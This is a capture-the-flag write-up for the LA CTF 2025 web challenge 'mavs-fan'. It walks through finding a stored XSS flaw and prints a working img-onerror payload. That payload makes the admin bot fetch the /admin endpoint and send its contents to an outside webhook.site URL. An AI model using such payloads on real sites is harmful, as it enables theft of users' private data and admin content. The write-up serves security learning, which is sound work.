# mavs-fan

## Background

Just a Mavs fan trying to figure out what Nico Harrison cooking up for my team nowadays...<br>
Hint - You can send a link to your post that the admin bot will visit. Note that the admin cookie is HttpOnly!<br>
Site - mavs-fan.chall.lac.tf<br>
Admin Bot - https://admin-bot.lac.tf/mavs-fan

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/LA-CTF-2025/images/image.png)

- **Difficulty: Easy**
- **This challenge has source code: [mavs-fan.zip](https://github.com/vodanh1903/CTF-Writeups/blob/main/LA-CTF-2025/Web/mavs-fan/mavs-fan.zip)**

## Enumeration

Index page:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/LA-CTF-2025/images/image-1.png)

In this page, we have an input field and this challenge has an admin bot, so it's could be an client-side vulnerability. But first I will give it some input to see how it processes:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/LA-CTF-2025/images/image-2.png)

Click `Send Message` and it will redirect us to another page, which contains a post and our input:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/LA-CTF-2025/images/image-3.png)

Okay, so I will try to exploit XSS by giving it a simple payload for testing XSS `<script>alert(1)</script>`, click `Send Message`:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/LA-CTF-2025/images/image-4.png)

Hmm, it seems like my payload doesn't work. I will inspect this page to see if it has filtered my payload:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/LA-CTF-2025/images/image-5.png)

Oh, my payload is still on the page and it seems not to be sanitized. So the payload may be successfully executed but the backend somehow handles it so it won't show to the client. Then I will test a payload with `img` tag to see if it's executed before looking through the source code. My payload: `<img src=x onerror="alert(1)"/>`.<br>

Explain about the payload:<br>
- 1. We will use the `img` tag with `src` attribute and `onerror` attribute. 
- 2. The `src=x` will cause an error because the `x` doesn't exist, and when an error appears, the `onerror="alert(1)"` get executed.<br>

The result when I send the payload:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/LA-CTF-2025/images/image-6.png)

The payload works! Now, I need to look for the source code to see where and how I can read the flag.<br>
> Reading the source code, Idk why the `script` tag can't be executed cause I see no filter apllied on our input, maybe the web page has WAF which blocks the `script` tag or am I missing something???
In `app.js`, we can see that the flag is located at the endpoint `/admin`:

```js
[...]
app.get('/admin', (req, res) => {
    if (!req.cookies.secret || req.cookies.secret !== ADMIN_SECRET) {
        return res.redirect("/");
    }
    return res.json({ trade_plan: FLAG });
});
[...]
```

To read the flag, we need the cookie of the admin and we have the admin bot!.

## Exploitation

 So, the idea is:<br>
- 1. We let the admin bot read the content of endpoint `/admin`
- 2. We will make the bot send the content to our domain ( I will use [webhooks.site](https://webhook.site/) ), so we can read the flag!<br>

This is my payload for this challenge: `<img src="x" onerror="fetch('https://mavs-fan.chall.lac.tf/admin') .then(res => res.text()) .then(data => { fetch('https://webhook.site/273fb9ed-bb43-424f-b0b9-ceed3f8c3d22/?d='+encodeURIComponent(data)); });" />`.<br>

Explain about the payload:<br>
- 1. First, we will use `img` tag to execute XSS which I've explained above.
- 2. When the `onerror` is loaded, we will make the bot read the content of the endpoint `/admin` through [`fetch()`](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API).
- 3. Then, we will use [`then()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then) to handle the data, the content of the endpoint `/admin` will be assigned to `res` and then it can be read through `res.text()`.
- 4. Next, we will use `then()` again and assign `res.text()` to `data` and make the bot send the `data` to our webhook through `d` parameter with `fetch()`. (Remember to use [`encodeURIComponent()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent) if you want to dynamically assemble string values into a URL)<br>

Back to the exploitation, we will save this payload to a post like we did before:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/LA-CTF-2025/images/image-7.png)

Next, we will send the url to our post to the admin bot, so it will read the post and then the payload will be executed:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/LA-CTF-2025/images/image-8.png)

Click `Submit` and we should receive the flag on our webhook:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/LA-CTF-2025/images/image-9.png)

- **Flag: `lactf{m4yb3_w3_sh0u1d_tr4d3_1uk4_f0r_4d}`**

## Conclusion

What we've learned:

1. Cross-site Scripting (XSS)